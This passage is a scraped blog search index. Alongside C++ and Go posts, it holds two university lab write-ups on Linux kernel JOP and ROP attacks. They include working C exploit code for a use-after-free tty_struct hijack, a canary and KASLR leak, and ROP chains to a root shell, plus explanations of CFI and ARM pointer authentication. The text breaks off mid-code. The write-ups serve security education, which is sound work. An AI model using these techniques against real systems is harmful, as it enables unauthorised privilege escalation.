严格意义上讲，减少内存拷贝的是移动语义，而不是右值引用；右值引用的目的是为了实现移动语义，但是使用右值引用不代表就实现了移动语义\n如果没有实现移动构造和移动赋值会发生什么？\n如果一个类没有实现移动构造和移动赋值，但使用了移动语义，那么move会退化成copy；需要注意在一些情况下编译器会生成默认移动构造和默认移动赋值函数\n左值引用类型的变量是左值，右值引用类型的变量是右值；函数的参数为左值/右值引用类型，他们在函数体中就是左值/右值 The compiler treats a named rvalue reference as an lvalue and an unnamed rvalue reference as an rvalue\n左值右值和类型是独立的概念，一个右值引用类型的变量可以是左值，将右值引用作为参数的函数会将该参数视为函数体中的左值；一个右值引用类型的变量也可以是右值，比如print(forward\u0026lt;int\u0026gt;(x))的结果为print(int \u0026amp;\u0026amp;)，int \u0026amp;\u0026amp;为临时变量，故为右值\n具体见下面的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 template\u0026lt;typename T\u0026gt; void print(T\u0026amp; t){ cout \u0026lt;\u0026lt; \u0026#34;lvalue\u0026#34; \u0026lt;\u0026lt; endl; } template\u0026lt;typename T\u0026gt; void print(T\u0026amp;\u0026amp; t){ cout \u0026lt;\u0026lt; \u0026#34;rvalue\u0026#34; \u0026lt;\u0026lt; endl; } template\u0026lt;typename T\u0026gt; void TestForward(T\u0026amp;\u0026amp; v){ print(v); // 任何的函数内部，对形参的直接使用，都是按照左值进行的 print(std::forward\u0026lt;T\u0026gt;(v)); print(std::move(v)); } int main(){ TestForward(1); // int \u0026amp;\u0026amp; -\u0026gt; int \u0026amp;\u0026amp; ，T为int，v是右值引用类型 int x = 1; TestForward(x); // int\u0026amp; \u0026amp;\u0026amp; -\u0026gt; int \u0026amp;，T为int\u0026amp;，v是左值引用类型 TestForward(std::forward\u0026lt;int\u0026gt;(x)); // int \u0026amp;\u0026amp; -\u0026gt; int \u0026amp;\u0026amp;，T为int，v是右值引用类型 // forward\u0026lt;int\u0026gt;(x)得到的是临时变量，类型为int \u0026amp;\u0026amp;，进入TestForward, T为int return 0; } /* Output： lvalue rvalue rvalue lvalue lvalue rvalue lvalue rvalue rvalue */ Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-10T10:00:00Z","image":"https://unicocn.github.io/p/cpp-understand-reference/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-understand-reference/","title":"理解万能引用｜左值引用｜右值引用"},{"content":"如何学习Golang 快速入门： Go by Example 中文版\n小项目： 7天用Go从零实现分布式缓存GeeCache\nGo语言设计与实现： Go 语言设计与实现\nGo语言圣经： Go语言圣经\nGo学习路线： 字节跳动Go语言学习路线图\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-07T23:50:00Z","image":"https://unicocn.github.io/p/go/cover_hued9042ee9f0e7aee045d9f1b3a4675de_133670_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/go/","title":"Go语言学习路线"},{"content":"Lab3 JOP | Linux内核漏洞攻防 Link: https://zjusec.gitee.io/syssec23-stu/lab3/\n思考题1 Q1. 为什么在堆上分配相同大小内存的时候，两次分配的内存地址会一样\nLinux内核在堆上分配内存时，通常会使用如下系统调用\nmalloc(分配小块内存时调用) brk：将数据段(.data)的最高地址指针_edata往高地址推（从堆头开始，参数为地址） sbrk：将地址指针往高地址推（从当前指针位置开始，参数为指针增量） mmap(默认分配大于128k内存时调用) 由于频繁的分配释放内存容易产生碎片，并且会影响性能，因此Linux引入了基于内存池的内存管理方式，堆内存的分配和回收进行统一管理，对于每一块内存称之为chunk\n被用户free掉的chunk，通过指针连接成链表，不同大小的内存连接成不同的链表，每一个链表称之为bin，当再次需要分配某一个大小的内存时，就在对应大小的chunk连接成的bin中分配即可，进而减少碎片，也可以提高内存分配效率\n因此当我们在堆上分配相同大小内存时，被free的内存被接入bin中，再次分配相同大小的内存就会从bin上分配，进而极大增加了分配到的内存地址相同的概率；这也就解释了为什么在UAF利用中，两次分配的内存地址会一样\nTask1：设备接口的使用 \u0026amp; 思考题2 根据UAF的原理，我们先两次打开/dev/zjudev设备，分配并释放大小为sizeof(tty_struct)的缓冲区，这样做是为了之后打开/dev/ptmx设备，分配tty_struct结构体时能够分配到与/dev/zjudev相同地址的缓冲区 之后我们打开/dev/ptmx设备，并判断是否分配到了与/dev/zjudev相同的缓冲区；判断的方法是，我们观察tty_struct结构体： 1 2 3 4 5 6 7 8 9 10 struct tty_struct { int\tmagic; struct kref kref; struct device *dev;\t/* class device or NULL (e.g. ptys, serdev) */ struct tty_driver *driver; const struct tty_operations *ops // ... } /* tty magic number */ #define TTY_MAGIC\t0x5401 在结构体的起始地址有一个magic变量，其值会被初始化成0x5401，而我们尽管不知道tty_struct结构体的地址，但是可以通过读取/dev/zjudev分配的缓冲区内容，判断最开始的四个字节是否为0x5401即可\n具体实现上，可以使用一个死循环，不断打开/dev/ptmx设备，判断/dev/zjudev的缓冲区内容是否为0x5401，当结果为是，则跳出循环，返回ptmx的文件描述符 之后，我们就可以通过调用/dev/zjudev设备的write接口，修改缓冲区内容，进而修改tty_struct结构体的内容 Q2. 如何确定自己所控制的指针一定被分配给 tty_struct结构体\n见之前的分析，通过tty_struct结构体开头的magic变量的值进行判断\n附代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #define TTY_STRUCT_SIZE 0x2B8 #define TTY_MAGIC 0x5401 size_t tty_op_buf[36]; char tty_buf[TTY_STRUCT_SIZE]; int init_dev() { int dev1 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); int dev2 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); ioctl(dev1, 0x0001, TTY_STRUCT_SIZE); close(dev1); return dev2; } int init_ptmx(int dev_fd) { int ptmx_fd; for (;;) { ptmx_fd = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); memset(tty_buf, \u0026#39;\\0\u0026#39;, sizeof(tty_buf)); read(dev_fd, tty_buf, TTY_STRUCT_SIZE - 1); for (size_t i = 0; i \u0026lt; TTY_STRUCT_SIZE; i += 8) { char v_str[9]; memcpy(v_str, tty_buf + i, 8); v_str[8] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;tty_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)v_str); } size_t magic = 0; memcpy(\u0026amp;magic, tty_buf, 4); if (magic == TTY_MAGIC) break; printf(\u0026#34;\\n\u0026#34;); } printf(\u0026#34;TTY_MAGIC match! ptmx_fd = %d\\n\u0026#34;, ptmx_fd); return ptmx_fd; } int main(int argc, char* argv[]) { int dev_fd = init_dev(); int ptmx_fd = init_ptmx(dev_fd); return 0; } Task2：简单获取root shell \u0026amp; 思考题3 观察tty_struct结构体，我们可以发现有一个const struct tty_operations* ops指针，其指向的是一组可以被调用的函数指针，当我们对/dev/ptmx设备进行操作时，调用的就是其中的函数；struct tty_operations的具体结构如下： 1 2 3 4 5 6 7 8 9 10 struct tty_operations { struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); // ... } 由于我们之前使得tty_struct的地址和/dev/zjudev中分配的缓冲区起始地址相同，那么我们就可以通过覆写缓冲区进而修改ops指针的值，而我们完全可以将ops指向一块大小和tty_operations相同的区域，但里面的函数指针全都指向hack_cred函数的地址，那么我们就可以通过调用/dev/ptmx设备的方法，进而调用hack_cred函数，获取root权限 首先我们需要获得hack_cred的函数地址，由于没有开始ASLR，因此直接在System.map里面查表即可 可以看到tty_operations中共有36个函数指针，每个函数指针大小为8B，因此我们创建一个大小为36*8B的数组tty_op_buf，其中所有函数指针都指向hack_cred，之后获取ptr = \u0026amp;tty_op_buf，将ptr覆盖ops指针，进而调用hack_cred Q3. 为什么不能直接通过 UAF 控制 cred 结构体直接修改其内容？有没有办法能够通过 UAF 来利用新版本的 cred 结构体呢？\n在Linux kernel 4.5版本之前是可以的，但是在Linux kernel 4.5版本及之后就不可以了，可以比较kernel 4.5版本对cred_init函数的修改(参考了https://zhuanlan.zhihu.com/p/437464189)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 4.4.72 /* * initialise the credentials stuff */ void __init cred_init(void) { /* allocate a slab in which we can store credentials */ cred_jar = kmem_cache_create(\u0026#34;cred_jar\u0026#34;, sizeof(struct cred), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL); } 4.5 /* * initialise the credentials stuff */ void __init cred_init(void) { /* allocate a slab in which we can store credentials */ cred_jar = kmem_cache_create(\u0026#34;cred_jar\u0026#34;, sizeof(struct cred), 0,SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL); } 可以注意到，在 slab 的创建 flag 中多了 一个 SLAB_ACCOUNT，意味着cred_jar和kmalloc不再合并，也就是说cred分配的内存和kmalloc分配的内存来自两个不同的区域，因此无法使得通过kmalloc分配的内存和分配给cred的内存拥有相同的起始地址，也就无法通过UAF控制cred结构体\n附代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #define TTY_STRUCT_SIZE 0x2B8 #define TTY_MAGIC 0x5401 #define HACK_CRED_ADDR 0xffff80001083aa84 size_t tty_op_buf[36]; char tty_buf[TTY_STRUCT_SIZE]; void exp_task2(int dev_fd, int ptmx_fd) { printf(\u0026#34;Jump into exp_task2!\\n\u0026#34;); // 创建tty_op_buf，将其中的函数指针都修改为HACK_CRED_ADDR for (size_t i = 0; i \u0026lt; 36; ++i) tty_op_buf[i] = HACK_CRED_ADDR; char my_buf[32]; size_t ptr = (size_t)(\u0026amp;tty_op_buf); printf(\u0026#34;ptr = %lx\\n\u0026#34;, ptr); memcpy(my_buf, tty_buf, 24); // 修改ops指针，指向tty_op_buf memcpy(my_buf + 24, \u0026amp;ptr, 8); for (size_t i = 0; i \u0026lt; 32; i += 8) printf(\u0026#34;my_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)(my_buf + i)); // 覆写缓冲区 write(dev_fd, my_buf, 32); // 检查缓冲区是否被修改 printf(\u0026#34;check ttyy_buf\\n\u0026#34;); read(dev_fd, tty_buf, TTY_STRUCT_SIZE - 1); for (size_t i = 0; i \u0026lt; 32; i += 8) printf(\u0026#34;tty_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)(tty_buf + i)); // 调用close操作ptmx设备，真正调用的是hack_cred函数 close(ptmx_fd); system(\u0026#34;/bin/sh\u0026#34;); return; } int main(int argc, char* argv[]) { int dev_fd = init_dev(); int ptmx_fd = init_ptmx(dev_fd); exp_task2(dev_fd, ptmx_fd); return 0; } Task3：gadget获取root shell \u0026amp; 思考题4 在task3中我们无法直接调用hack_cred函数获取root权限，需要使用gadget，本质上就是通过gadget控制传参的寄存器，进而依次调用struct cred* root_cred = prepare_kernel_cred(NULL)和commit_creds(root_cred)获取root权限\n我们先观察一下这几个gadget分别做了什么\nzju_gadget1: 将 [x0 + 0x38]地址的值赋值给x1，将x2的值赋值给x0，跳转到x1储存的地址处 zju_gadget2: 将x0置0，将[x2 + 0x28]地址的值赋值给x1，跳转到x1储存的地址处 zju_gadget3: 直接返回 之后我们的思路就明确了，我们首先通过zju_gadget3获取ty_struct的地址，之后通过zju_gadget2调用prepare_kernel_cred方法，获取返回值，之后再调用commit_creds方法获取root权限 首先我们需要获取tyy_struct的地址\n在之前的实验中，尽管我们可以修改tyy_struct结构的值，但是我们需要在之后将tty_struct的地址作为参数传入gadget，因此我们需要得到它的地址 在arm中，函数的第一个参数会保存在x0中，函数返回的值也会保存在x0中，而我们观察ioctl方法 1 2 3 4 5 6 7 // x0 = tty_struct_of_fd, x1 = p1, x2 = p2 int ioctl(int fd, unsigned long int p1, void *p2) { ioctl_operation(tty_struct_of_fd, p1, p2); } // x0 = \u0026amp;tty, x1 = cmd, x2 = arg int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); 可以其会将参数按照顺序传入ioctl_operation，之后在ioctl函数指针中，第一个参数就是tty_struct的指针，因此x0就是tty_struct的起始地址\n我们将ioctl方法覆写为zju_gadget3，return得到的返回值(x0)就是tty_struct的起始地址；需要注意由于返回值为int类型，在赋值为64bit类型变量后，需要手动将最高16位赋值为0xffff 之后我们需要调用prepare_kernel_gadget函数\n首先这个函数的参数需要是NULL，而NULL在C中就是0，因此我们可以想到利用zju_gadget2，同时x0正好作为prepare_kernel_gadget的第一个参数 如何调用prepare_kernel_gadget函数？可以发现zju_gadget2将[x2 + 0x28]地址的值赋值给x1，之后跳转到x1储存的地址处，那么我们就可以将prepare_kernel_gadget的地址放到[x2 + 0x28] x2是可以通过ioctl传入的参数，也就是p2，那么我们就可以直接传入tty_struct的起始地址，将[addr+0x28]处的地址覆写成prepare_kernel_gadget的地址即可 最后将返回值保存，之后需要传入commit_creds 之后就是调用commit_creds，和之前一样的思路，在zju_gadget1中，将 [x0 + 0x38]地址的值赋值给x1，将x2的值赋值给x0，跳转到x1储存的地址处；因此我们可以通过覆写 [x0 + 0x38]地址处的值为commit_creds的地址对其调用，同时将prepare_kernel_cred的返回值作为参数传入x2，在zju_gadget1中传入x0，进而调用函数\nQ4. 为什么第二步可以直接ret获取到 tty_struct结构体的地址？ret 执行前后的控制流是什么样的？\n根据之前的分析，当调用int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg)函数签名时，第一个参数就到 tty_struct结构体的地址，通过x0寄存器传参；而我们实际上调用的是zju_gadget3，此时传参是正常的，但是在函数体中直接return，没有修改x0寄存器的值；而arm架构中函数的返回值也储存在x0寄存器中，函数返回值也就是 tty_struct结构体的地址\n控制流：my_function -\u0026gt; int ioctl(int fd, unsigned long int p1, void *p2) -\u0026gt; \u0026hellip; tty_optarions.ioctl(struct tty_struct *tty, unsigned int cmd, unsigned long arg) -\u0026gt; zju_gadget3 -\u0026gt; \u0026hellip; -\u0026gt; my_function\n附代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #define TTY_STRUCT_SIZE 0x2B8 #define TTY_MAGIC 0x5401 #define ZJU_GADGET_ONE_ADDR 0xffff80001083aa44 #define ZJU_GADGET_TWO_ADDR 0xffff80001083aa5c #define ZJU_GADGET_THREE_ADDR 0xffff80001083aa74 #define PREPARE_KERNEL_CRED_ADDR 0xffff8000100b6030 #define COMMIT_CREDS_ADDR 0xffff8000100b5bac size_t tty_op_buf[36]; char tty_buf[TTY_STRUCT_SIZE]; int init_dev() { int dev1 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); int dev2 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); ioctl(dev1, 0x0001, TTY_STRUCT_SIZE); close(dev1); return dev2; } int init_ptmx(int dev_fd) { int ptmx_fd; for (;;) { ptmx_fd = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); memset(tty_buf, \u0026#39;\\0\u0026#39;, sizeof(tty_buf)); read(dev_fd, tty_buf, TTY_STRUCT_SIZE - 1); for (size_t i = 0; i \u0026lt; TTY_STRUCT_SIZE; i += 8) { char v_str[9]; memcpy(v_str, tty_buf + i, 8); v_str[8] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;tty_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)v_str); } size_t magic = 0; memcpy(\u0026amp;magic, tty_buf, 4); if (magic == TTY_MAGIC) break; printf(\u0026#34;\\n\u0026#34;); } printf(\u0026#34;TTY_MAGIC match! ptmx_fd = %d\\n\u0026#34;, ptmx_fd); return ptmx_fd; } void exp_task3(int dev_fd, int ptmx_fd) { printf(\u0026#34;Jump into exp_task3!\\n\u0026#34;); memset(tty_op_buf, \u0026#39;\\0\u0026#39;, sizeof(tty_op_buf)); char my_buf[0x40]; size_t ptr = (size_t)(\u0026amp;tty_op_buf); size_t prepare_kernel_cred_addr = PREPARE_KERNEL_CRED_ADDR; size_t commit_creds_addr = COMMIT_CREDS_ADDR; memcpy(my_buf, tty_buf, 0x40); memcpy(my_buf + 24, \u0026amp;ptr, 8); memcpy(my_buf + 0x28, \u0026amp;prepare_kernel_cred_addr, 8); memcpy(my_buf + 0x38, \u0026amp;commit_creds_addr, 8); write(dev_fd, my_buf, 0x40); tty_op_buf[12] = ZJU_GADGET_THREE_ADDR; size_t tty_addr = ioctl(ptmx_fd, 0x0, 0x0) | 0xffff000000000000; printf(\u0026#34;tty_addr = 0x%lx\\n\u0026#34;, tty_addr); tty_op_buf[12] = ZJU_GADGET_TWO_ADDR; commit_creds_addr = ioctl(ptmx_fd, 0x0, my_buf) | 0xffff000000000000; printf(\u0026#34;commit_creds_addr = 0x%lx\\n\u0026#34;, commit_creds_addr); tty_op_buf[12] = ZJU_GADGET_ONE_ADDR; ioctl(ptmx_fd, 0x0, commit_creds_addr); system(\u0026#34;/bin/sh\u0026#34;); return; } int main(int argc, char* argv[]) { int dev_fd = init_dev(); int ptmx_fd = init_ptmx(dev_fd); exp_task3(dev_fd, ptmx_fd); return 0; } Task4：内核CFI保护 使用objdump反汇编开启CFI的内核镜像 vmlinux，获得汇编代码，提交任意一个间接调用的汇编代码，并详细解释CFI是如何防御JOP攻击 我们分别在开始CFI和没开启CFI的vmlinux镜像中反汇编tty_driver_flush_buffer函数，关键代码如下\nCFI:\nNoCFI:\n关注如下片段：\n1 2 3 4 5 6 7 ffff800008bd9594:\tb4000108 cbz\tx8, ffff800008bd95b4 \u0026lt;tty_driver_flush_buffer+0x38\u0026gt; ffff800008bd9598:\td00061c9 adrp\tx9, ffff800009813000 \u0026lt;regulator_get_current_limit.cfi_jt\u0026gt; ffff800008bd959c:\t912d0129 add\tx9, x9, #0xb40 ffff800008bd95a0:\tcb090109 sub\tx9, x8, x9 ffff800008bd95a4:\t93c90d29 ror\tx9, x9, #3 ffff800008bd95a8:\tf100a93f cmp\tx9, #0x2a ffff800008bd95ac:\t540000c2 b.cs\tffff800008bd95c4 \u0026lt;tty_driver_flush_buffer+0x48\u0026gt; // b.hs, b.nlast 可以看到在开启了CFI之后，出现了regulator_get_current_limit.cfi_jt标签，如果x8和x9寄存器的值不满足要求，就会跳转到该标签对应的函数处，之后调用handle_cfi_failure处理CFI failure；总结来说，CFI通过对函数跳转地址的检查，进而防止JOP攻击\n重新运行JOP攻击程序，查看是否CFI是否能起作用。提交demsg中包含CFI Failure截图 重新运行JOP攻击程序，发现CFI生效，无法跳转到目标函数\n之后调用dmesg，发现触发了cfi_failure\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-07T23:50:00Z","image":"https://unicocn.github.io/p/jop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_120x120_fill_q75_box_smart1.jpg","permalink":"https://unicocn.github.io/p/jop/","title":"JOP | Linux内核攻防"},{"content":"ROP | Linux内核攻防 Link: https://zjusec.gitee.io/syssec23-stu/lab2/\nTask1：绕过stack canary和KASLR 首先根据实验指南，当我们read时，读取的是全局变量prev_cmd，而当我们write的时候，会将buffer先赋值给cmd，再将cmd赋值给prev_cmd；在zjubof_write4中，看似对cmd.length作出了限制，但是并没有对len作出限制，因此存在overflow漏洞，可以通过溢出修改cmd.length，进而将canary/oldfp/ra读到prev_cmd中 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ssize_t zjubof_write4(char *buffer,size_t len) { struct cmd_struct cmd; printk(\u0026#34;zjubof_write4\\n\u0026#34;); memset(cmd.command, 0, 16); cmd.length = len; if(cmd.length \u0026gt; 16) cmd.length = 16; memcpy(cmd.command, buffer, len); memcpy(prev_cmd,cmd.command, cmd.length); printk(\u0026#34;cmd :%s len:%ld\\n\u0026#34;, cmd.command,len); return 0; } ssize_t zjubof_write3(char *buffer,size_t len) { printk(\u0026#34;zjubof_write3\\n\u0026#34;); zjubof_write4(buffer, len); return 0; } 函数调用栈如下所示：\n触发buffer overflow的核心在于： 1 2 3 4 5 6 if(cmd.length \u0026gt; 16) cmd.length = 16; // 尽管程序对于cmd.length作出了限制，但是并没有对len进行限制 memcpy(cmd.command, buffer, len); // 通过buffer覆盖cmd.length // 此时cmd.length被修改，prev_cmd可以读取到canary/lr信息 memcpy(prev_cmd,cmd.command, cmd.length); 因此我们可以构造buffer如下：\nbuf[49] = \u0026quot;0123456789ABCDEF\\x30\u0026quot;，49 = 48 + 1,48为需要泄露的字节数，1为buf末尾的\\0\n进而我们可以泄露canary/lr/oldfp，由于lr(ra)保存的是zjubof_write2中调用zjubof_write3之后的返回地址，反汇编zjubof_write2得到无偏移的RA，再与开启KASLR的lr(ra)相减即可得到偏移 关键代码如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const size_t RAWithoutKASLR = 0xffff800010de7d0c; char canaryStr[8]; // canary char oldFPStr[8]; // fp of zjubof_write2 char oldRAStr[8]; // ra of zjubof_write3 -\u0026gt; zjubof_write2 size_t getOffset(int fd) { size_t len = 0; char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; // cmd.command = \u0026#34;0123456789ABCDEF\u0026#34;, cmd.length = 0x30 len = write(fd, buf, 24); // // 16 + 8 B len = read(fd, buf, 48); // CMD_LENGTH = 49, len \u0026lt; 49 memset(canaryStr, \u0026#39;\\0\u0026#39;, sizeof(canaryStr)); memcpy(canaryStr, buf+24, 8); memset(oldFPStr, \u0026#39;\\0\u0026#39;, sizeof(oldFPStr)); memcpy(oldFPStr, buf+32, 8); memset(oldRAStr, \u0026#39;\\0\u0026#39;, sizeof(oldRAStr)); memcpy(oldRAStr, buf+40, 8); size_t canary = *(size_t *) canaryStr; size_t oldFP = *(size_t *) oldFPStr; size_t oldRA = *(size_t *) oldRAStr; size_t offset = oldRA - RAWithoutKASLR; return offset; } 结果 至此，我们成功泄露了canary和offset，之后就可以通过偏移量绕过KASLR\nTask2: 修改return address，获取 root 权限 Task2要求我们修改ra，跳转到first_level_gadget，由first_level_gadget实现提权；我们先反汇编一下first_level_gadget，发现第一行代码修改了sp，而修改ra后返回时，sp已经被设置好了，如果此时跳转到第一行，sp再次被修改，就会导致栈空间出错，进而导致程序出错，因此需要跳到第二行 分析函数调用时sp的变化 zjubof_write call zjubof_write2: 1 2 3 sp = sp - 220 # ... sp = sp + 220 zjubof_write2 call zjubof_write3: 1 2 3 sp = sp - 32 # ... sp = sp + 32 zjubof_write3 call zjubof_write4: 1 2 3 sp = sp - 80 # ... sp = sp + 80 当我们覆盖返回地址跳转到first_level_gadget时，sp+80和sp+32已经被执行，此时的sp[0]和sp[8]分别指向zjubof_write的oldfp(x29)和ra(x30)，在first_level_gadget中无需再将x29和x30压栈，同时为了在first_level_gadget执行完后能够正确返回到zjubof_write，需要手动添加指令将sp+220\n分析得到栈空间如下，并构造buffer buffer的前24字节和Task1是一样的，但是需要将Task1中得到的canary/oldfp填入buffer的24-40字节，然后将新的返回地址填入40-48字节\n关键代码及结果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void hackUsingFirstLevelGadget(int fd, size_t offset) { char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; size_t newRA = RAToFirstLevelGadget + offset; memcpy(buf + 24, canaryStr, 8); memcpy(buf + 32, oldFPStr, 8); memcpy(buf + 40, (char*)\u0026amp;newRA, 8); write(fd, buf, 48); system(\u0026#34;/bin/sh\u0026#34;); return; } flag：sysde655sEc\nTask3: ROP 获取 root 权限 这次我们需要使用ROP进行提权，函数调用栈为 1 2 3 4 5 6 7 8 9 zjubof_write4 -\u0026gt; zjubof_write3-\u0026gt;prepare_kernel_cred-\u0026gt;commit_creds-\u0026gt;second_level_gadget into zjubof_write3: sp = sp - 32 leave zjubof_write3: sp = sp + 32 into prepare_kernel_cred: sp = sp - 32 leave prepare_kernel_cred: sp = sp + 32 into commit_creds: sp = sp - 48 leave commit_creds: sp = sp + 48 into second_level_gadget: sp = sp leave second_level_gadget: sp = sp + 464 根据函数调用栈，得到栈布局 构造buffer如下 1 2 3 4 5 6 buf.length = 160 + 1 (160 B + \u0026#39;\\0\u0026#39;) buf[24 ... 30] = canary buf[40 ... 48] = RA of prepare_kernel_cred buf[72 ... 80] = RA of commit_creds buf[104 ... 112] = RA of second_level_gadget buf[152 ... 160] = RA of zjubof_write 各个ROP的跳转地址分别为：\nRA of prepare_kernel_cred: 0xffff8000100a6214\nRA of commit_creds: 0xffff8000100a5f6c\nRA of second_level_gadget: 0xffff8000107abdb0（因为第一条指令不改变sp，因此可以直接跳 ）\nRA of zjubof_write: 0xffff8000107abe54\n关键代码及结果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void hackUsingROP(int fd, size_t offset) { char buf[161]; memset(buf, \u0026#39;\\0\u0026#39;, sizeof(buf)); memcpy(buf + 24, canaryStr, 8); size_t prepareKernelCredRA = RAOfPrepareKernelCred + offset; memcpy(buf + 40, (char*)\u0026amp;prepareKernelCredRA, 8); size_t commitCredsRA = RAOfCommitCreds + offset; memcpy(buf + 72, (char*)\u0026amp;commitCredsRA, 8); size_t secondLevelGadgetRA = RAOfSecondLevelGadget + offset; memcpy(buf + 104, (char*)\u0026amp;secondLevelGadgetRA, 8); size_t ZJUBofWriteRA = RAOfZJUBofWrite + offset; memcpy(buf + 152, (char*)\u0026amp;ZJUBofWriteRA, 8); write(fd, buf, 160); system(\u0026#34;/bin/sh\u0026#34;); return; } flag：sysde655sEc\nTask4: Linux内核对 ROP 攻击的防护 编译运行，之后执行exp 1 2 3 4 5 6 7 8 # 编译内核 export ARCH=arm64 make CROSS_COMPILE=aarch64-linux-gnu- defconfig make CROSS_COMPILE=aarch64-linux-gnu- menuconfig make CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc) # 将vmlinux精简成Image aarch64-linux-gnu-objcopy -O binary vmlinux Image --strip-all ./start.sh 发现出现段错误\n查看汇编代码，发现相比之前多了paciasp和autiasp这两个指令 这两个指令由ARM PA机制引入，这是一种指针认证的方式。其通过在存储指针之前向未使用的高位添加加密签名来工作，这也被称为指针认证码（PAC）。paciasp用于在存储指针值之前生成并插入指针认证代码（PAC），而autiasp则用于在从内存读回后验证并删除指针值中的PAC。这种机制可以保证在写入和读取指针之间对指针值的任何更改都会使签名无效，进而CPU会将身份验证失败解释为内存损坏，并设置指针中的高位，使该指针无效并导致应用程序崩溃。\n总结来说，在进入函数的时候，栈上存储的不再是返回地址，而是附带着加密后的返回地址，在离开函数时会校验这个地址的合法性，如果合法即未被篡改函数才能正常返回；同时由于攻击者无法得知密钥以及加密算法，因此攻击者无法构造出加密后的返回地址进行buffer overflow，也就无法进行 ROP 攻击\n思考题 为什么linux canary的最低位byte总是 \\00？ 保证内存对齐，可以提高内存访问效率；同时可以将其当做字符串的终止符，防止canary的泄露\n在ARM64的ROP中，在 zjubof_write4中overflow覆盖到的返回地址，会在 什么时候/执行到哪个函数哪一行的时候被load到pc寄存器？ 会在zjubof_write3的return 0;，也就是在zjubof_write3汇编的ldp x29, x30, [sp], #32行，x29和x30被更新，然后执行ret时load到pc寄存器\n在Task2中，为什么在exp中直接覆盖返回地址为 first_level_gadget 的汇编第一行地址，会造成kernel在运行到这一行的时候产生panic？并写出造成这个panic的触发链 当跳转到first_level_gadget且尚未执行其中的汇编时，栈空间如下所示\n此时zjubof_write3和zjubof_write4部分的栈空间已经被释放，可以看到sp已经指向了栈底，同时x29和x30寄存器的值已经是被正确压栈了，此时我们如果跳到第一行，则又会将x29和x30压栈，而此时的x29和x30寄存器保存的是first_level_gadget的中的返回地址和旧栈帧，也就是下面这样\n当first_level_gadget执行完成后，会首先更新x29和x30，正常情况下会跳回zjubof_write1，并将sp+220进而恢复sp，而现在则会再次跳到first_level_gadget，同时sp+220也会更新到错误的地方，之后就是重复的再次跳到first_level_gadget，同时sp+220错误的更新，直到stack overflow\nLinux 内核是如何利用 ARM PA 来防御 ROP 攻击的 见Task4中的分析\n附exp.c完整代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; const size_t RAWithoutKASLR = 0xffff800010de7d0c; const size_t RAToFirstLevelGadget = 0xffff8000107abd7c; const size_t RAOfPrepareKernelCred = 0xffff8000100a6214; const size_t RAOfCommitCreds = 0xffff8000100a5f6c; const size_t RAOfSecondLevelGadget = 0xffff8000107abdb0; const size_t RAOfZJUBofWrite = 